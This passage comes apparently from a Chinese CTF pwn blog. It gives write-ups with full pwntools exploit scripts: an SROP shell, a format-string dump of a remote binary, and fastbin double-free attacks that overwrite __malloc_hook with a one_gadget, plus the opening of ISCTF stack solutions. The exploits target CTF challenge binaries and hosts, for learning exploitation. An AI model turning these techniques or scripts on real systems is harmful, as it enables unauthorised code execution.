<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;nc1.ctfplus.cn&#x27;,43153)</span></span><br><span class="line">sh = <span class="number">0x40105a</span></span><br><span class="line">syscall_ret = <span class="number">0x40100f</span></span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.rax = <span class="number">0x3b</span></span><br><span class="line">sig.rdi = sh</span><br><span class="line">sig.rsi = <span class="number">0</span></span><br><span class="line">sig.rdx = <span class="number">0</span></span><br><span class="line">sig.rip = syscall_ret</span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span> + p64(<span class="number">0x401012</span>) + <span class="string">b&#x27;\0&#x27;</span>*<span class="number">8</span> + p64(syscall_ret) + <span class="built_in">bytes</span>(sig)</span><br><span class="line"><span class="comment">#pl = b&#x27;a&#x27;*0x108 + p64(0x401012) + p64(syscall_ret) + bytes(sig)</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(pl)</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/images/week3-4(1).png" alt="gdb"></p>
<p>我们可以看出elf0x40105a处放着&#x2F;bin&#x2F;sh，所以我们只需要去构造execve然后控制rdi处放着sh就好了。这里又多填充了8个字节是因为再次读完栈上的padding后，发现此时距离rbp的距离发生了改变，正好少了8个字节所以补入，而且这对第一次没有影响。</p>
<h2 id="5-BROP"><a href="#5-BROP" class="headerlink" title="5.BROP"></a>5.BROP</h2><p>Blind Rop。对远端nc，多试几次，可以发现这里存在fmt漏洞，并且偏移量是6。</p>
<p>然后结合题干给的信息来看，可以看出pie是关的，并且只要我们能接收到整个程序，我们就能get flag。</p>
<p><img src="/images/week3-5(1).png"></p>
<p>所以我们可以用%n$s来接收远端的数据，然后获取整个elf的数据。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">23333</span>)</span><br><span class="line"></span><br><span class="line">begin = <span class="number">0x400000</span></span><br><span class="line"><span class="built_in">bin</span> = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">    pl = <span class="string">b&#x27;%7$sdump&#x27;</span> + p64(addr)</span><br><span class="line">    io.sendline(pl)</span><br><span class="line">    data = io.recvuntil(<span class="string">&#x27;dump&#x27;</span>)[:-<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = leak(begin)</span><br><span class="line">        begin = begin+<span class="built_in">len</span>(data)</span><br><span class="line">        <span class="built_in">bin</span> +=data</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data)==<span class="number">0</span>:</span><br><span class="line">            begin +=<span class="number">1</span></span><br><span class="line">            <span class="built_in">bin</span> += <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;finish&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span>,<span class="built_in">len</span>(<span class="built_in">bin</span>))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dump_bin&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">bin</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这里由于偏移是6，所以我们写入的二%7$sdump是在6的位置，那么我们泄露数据的位置自然是在偏移为7处了。这里的dump是为了平衡栈，然后后面就是对数据的接收了。接收完后，我们可以看到一堆二进制乱码。仔细查找，可以看到几个我们能读懂的就是flag了。</p>
<p><img src="/images/week3-5(2).png"></p>
]]></content>
      <categories>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn入门</tag>
      </tags>
  </entry>
  <entry>
    <title>Double_free</title>
    <url>/2026/02/19/Double-free/</url>
    <content><![CDATA[<h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a><code>Double Free</code></h2><p>顾名思义就是进行两次free的操作。不过为什么要进行两次的free呢？</p>
<p>因为通过这样的手法就可以实现任意地址写。</p>
<h3 id="HGAME-2023-week2-new-fast-note"><a href="#HGAME-2023-week2-new-fast-note" class="headerlink" title="[HGAME 2023 week2]new_fast_note"></a><code>[HGAME 2023 week2]new_fast_note</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n4; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n4);</span><br><span class="line">    <span class="keyword">if</span> ( n4 == <span class="number">4</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( n4 &gt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong choice!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( n4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          show_note();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          add_note();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          delete_note(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>依旧是菜单函数。版本是2.31的。那么此时的tcache bins管理引入了double free的检测。也就是说我们不能通过在tcache bins中double free。所以我们可以在fast bins中进行double free。</p>
<p>首先我们需要泄露出libc。由于fast bins能管理的堆块最大的大小是0x80。所以我们可以先申请9个0x80字节大小的堆块。再释放掉八个。其中七个会被tcache bins管理，而一个会被unsorted bin管理，还有一个由我们管理的堆块则是为了防止我们free掉堆块后与top chunk合并。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br></pre></td></tr></table></figure>

<p>然后我们就可以通过修改malloc_hook为one_gadget来getshell了。由于我们现在泄露出了libc_base，所以可以轻松得到__malloc_hook和one_gadget的地址。现在就要进行double free的操作了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br></pre></td></tr></table></figure>

<p>首先我们先申请了8个堆块，为了后续占满tcache bins。这里free后也会占到一个fast bins。然后再申请8和9两个堆块并且释放。那么此时这里fast bins的管理情况是怎么样的呢？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x70: 0x55555555bab0 —▸ 0x55555555bb20 ◂— 0x55555555bab0</span><br></pre></td></tr></table></figure>

<p>可以看出，出现了8-&gt;9-&gt;8的一种情况。这个时候当我们申请掉8，并向8中写入__malloc_hook的真实地址会发生什么呢？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,p64(malloc_hook))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0x70 [  3]: 0x55555555bb30 —▸ 0x55555555bac0 —▸ 0x7ffff7fc1b70 (__malloc_hook) ◂— 0</span><br></pre></td></tr></table></figure>

<p>可以看出，我们fast bins管理的堆块不仅移到了tcache bins管理，并且这里最后成了__malloc_hook。那么我们再连续申请三个堆块就可以往malloc_hook里写入我们的one_gadget了。下次我们再次申请堆块的时候就可以getshell了。</p>
<p>这里从fast bins迁移到是tcache bins是因为我们申请的8个堆块有一个是从fast bins里取出的。那么此时程序就会认为既然你有需求，那下次再申请的时候就要提前准备，因为tcache bins管理更加快捷。所以就会迁移过来。</p>
<p>而这里的__malloc_hook的写入，就是我们申请的idx&#x3D;7的堆块，也就是说双重释放的堆块的fd是可以改写的。这就帮助了我们进行任意地址的写入。</p>
<p>下面给出完整的exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node5.anna.nssctf.cn&#x27;,24203)</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,pl</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    io.send(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">one_gadget = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">malloc_hook = base + libc.sym.__malloc_hook</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,p64(malloc_hook))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,p64(base+one_gadget[<span class="number">1</span>]))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;: &#x27;</span>,<span class="string">b&#x27;0x20&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="LitCTF-2024-heap-2-23"><a href="#LitCTF-2024-heap-2-23" class="headerlink" title="[LitCTF 2024]heap-2.23"></a><code>[LitCTF 2024]heap-2.23</code></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *%d, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  _init();</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        exit_0();</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里改了下函数名，显得显而易见一些。由于这里的版本是glibc2.23，所以没有tcache bins的管理。那我们就可以直接进行double free的操作了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> n0x10; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  n0x10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n0x10);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)n0x10 &lt; <span class="number">0x10</span> &amp;&amp; *(&amp;ptr + n0x10) )</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;ptr + n0x10));                      </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no such chunk!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出这里还是没有将释放的指针置空。所以这里存在uaf的漏洞。</p>
<p>所以我们可以通过修改__malloc_hook里的内容为one_gadget来getshell了。</p>
<p>首先由于fast bins管理的堆块最大只有0x80，所以我们这里可以申请0x80(实际会变成0x90)的chunk，然后释放。这样就会归到unsorted bin管理。然后通过uaf来非法访问得到libc的基地址。</p>
<p>再通过double free修改__malloc_hook为one_gadget。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.anna.nssctf.cn&#x27;,22382)</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>) <span class="comment">#uaf</span></span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">malloc_hook = base + libc.sym.__malloc_hook</span><br><span class="line">success(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">one_gadget = [<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">edit(<span class="number">2</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(base + one_gadget[<span class="number">2</span>]))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x20</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这里来解释一下。0的堆块是为了泄露libc的基地址。而1的堆块是防止0堆块释放后合并入top chunk中。这里为什么要申请0x60的堆块和改写的地址为什么要变成__malloc_hook-0x23呢？</p>
<p>是因为fast bins对分配堆块的size是有要求的。并不是说我们想要__malloc_hook处我们伪造的fake_chunk就直接给我们了。而是要满足和我们之前申请的堆块的size要一致。也就是这里的0x60。不过为什么一定是这个大小呢？</p>
<p>由于我们申请的空间是0x60，那么这个fake_chunk的实际大小其实是0x70。所以0x70~0x7f这些范围内的大小都被fast bins所接受。我们来看一下glibc2.23__malloc_hook周围的布局是什么样的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7ffff7bc4ae0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7bc4af0:	0x00007ffff7bc3260	0x0000000000000000</span><br><span class="line">0x7ffff7bc4b00 &lt;__memalign_hook&gt;:	0x00007ffff7885ea0	0x00007ffff7885a70</span><br><span class="line">0x7ffff7bc4b10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7bc4b20:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>可以看到在__malloc_hook-0x20处存在0x7f的存在。所以只要我们让fast bins认为这里的0x7f是fake_chunk的size就可以了。为什么不是-0x10处的0x7f而一定是-0x20处的0x7f呢？是因为malloc返回的地址实际上不是我们真正写入的地址。我们真正写入的地址是ptr+0x10。所以也就导致了我们需要偏移更多来使我们写入的数据地址起码得在malloc_hook之前。那这里的0x23的偏移量是怎么来的呢？由于小端序的原因，所以这里的位置关系应该是这样的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__malloc_hook-0x20:60              __malloc_hook-0x1f:32</span><br><span class="line">__malloc_hook-0x1e:bc              __malloc_hook-0x1d:f7</span><br><span class="line">__malloc_hook-0x1c:ff              __malloc_hook-0x1b:7f</span><br></pre></td></tr></table></figure>

<p>而在size之前还有pre_size大小8字节。所以距离__malloc_hook就应该是0x1b+0x8&#x3D;0x23。</p>
<p>在理清楚其中的逻辑后，不免觉得堆风水布局的重要性。以及各个版本存在的漏洞。</p>
]]></content>
      <categories>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn进阶</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCTF-Stack</title>
    <url>/2025/12/11/ISCTF-Stack/</url>
    <content><![CDATA[<h1 id="ISCTF"><a href="#ISCTF" class="headerlink" title="ISCTF"></a>ISCTF</h1><h2 id="1-Sign"><a href="#1-Sign" class="headerlink" title="1.Sign"></a>1.Sign</h2><p><img src="/images/is1-1.png" alt="ida"></p>
<p>看ida里，可以看出buf是一维数组。类型为dword，4字节。所以索引值为27的</p>
<p>时候，实际上是第28个元素。所以我们只需要控制覆。盖buf的第28个元素为-1378178390就可以getshell了。那么padding就是27*4&#x3D;108。由于这里是有符号数转16进制，所以上网站转换一下就行。</p>
<p><img src="/images/is1-2.png"></p>
<p>目标数的16进制是0xaddaaaaa。同时由于这里是dword，4字节，所以用p32包裹0xaddaaaaa就可以getshell了。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;challenge.bluesharkinfo.com&#x27;</span>,<span class="number">25138</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span> * <span class="number">108</span> + p32(<span class="number">0xaddaaaaa</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;do you like blueshark?&#x27;</span>,pl)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="2-Fmt"><a href="#2-Fmt" class="headerlink" title="2.Fmt"></a>2.Fmt</h2><p><img src="/images/is2-1.png" alt="ida"></p>
<p>经典的格式化字符串泄露。但是这里需要换一下附件的依赖。</p>
<p>由于这里给了libc.so.6，所以我们可以通过strings libc.so.6 | grep “ubuntu”来获得版本。</p>
<p>例如输出：GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.10) stable release version 2.35.</p>
<p>所以可以在glibc-all-in-one 去寻找2.35-0ununtu3的版本来下载动态链接器（一般保持大版本相同就行）。</p>
<p>patchelf –replace-needed (原版本)libc.so.6 (替换的版本).&#x2F;libc.so.6 (文件名).&#x2F;pwn</p>
<p>patchelf –set-interpreter ld-linux-x86-64.so.2(替换的版本) .&#x2F;pwn</p>
<p>如果能成功运行程序，那么基本就可以了。像检查的话，可以由ldd pwn来查看附件的以来情况。</p>
<p>回到这道题，第一步还是测试数据。可以得到offset&#x3D;6，那么canary的位置就是6 +（0x90-0x8）&#x2F;8 &#x3D; 23。</p>
<p><img src="/images/is2-2.png" alt="gdb"></p>
